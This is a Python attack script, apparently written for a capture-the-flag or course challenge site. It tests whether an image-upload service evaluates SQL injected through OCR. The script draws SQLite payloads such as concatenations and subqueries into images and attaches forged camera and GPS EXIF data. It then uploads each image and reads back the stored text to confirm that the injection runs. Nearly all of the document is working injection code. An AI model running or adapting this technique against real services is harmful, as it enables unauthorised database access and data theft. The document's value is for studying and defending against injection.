# v2_check_exec.py — the CASE test gave 200 for both. Read back WHAT got stored to learn whether
# the payload EXECUTED (concatenation happened) or was stored literally. This tells us if
# summary_ocr reaches SQL as an expression or as a bound parameter.
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
print("MY user_id:", UID)
base_img = Image.open("paisaje.png").convert("RGB")

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=32):
    W=min(1700,max(1000,40+int(len(text)*size*0.58))); H=280
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("ce.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"ce.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("ce.jpg","rb").read()).decode()

def go(painted, desc):
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    ocr=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
    print(f"{desc:14} {r.status_code} ocr={ocr!r}")
    return ocr

# If summary_ocr is a SQL expression, 'A'||char(66)||'C' would STORE as "A"+"B"+"C"=... but that's
# in the QUERY, not the value. Simpler: test if a KNOWN concatenation shows up executed.
# Paint: X||char(89)||X   -> if executed inside 'VALUES(...,'<ocr>')' the || would concat the
# stored string with char(89)='Y'. But actually the stored value IS what we typed unless the
# expression is evaluated. Let's just SEE the raw stored text for a few payloads.
print()
go("HELLOWORLD", "CE_plain")                    # baseline: how plain text stores
go("A||char(89)||B", "CE_concat")               # if || executes: stored may differ
go("9||(SELECT hex(1))", "CE_subq")             # if subquery runs: stored shows result of hex(1)
go("9||(SELECT sqlite_version())", "CE_ver")    # if runs: stored shows 3.xx
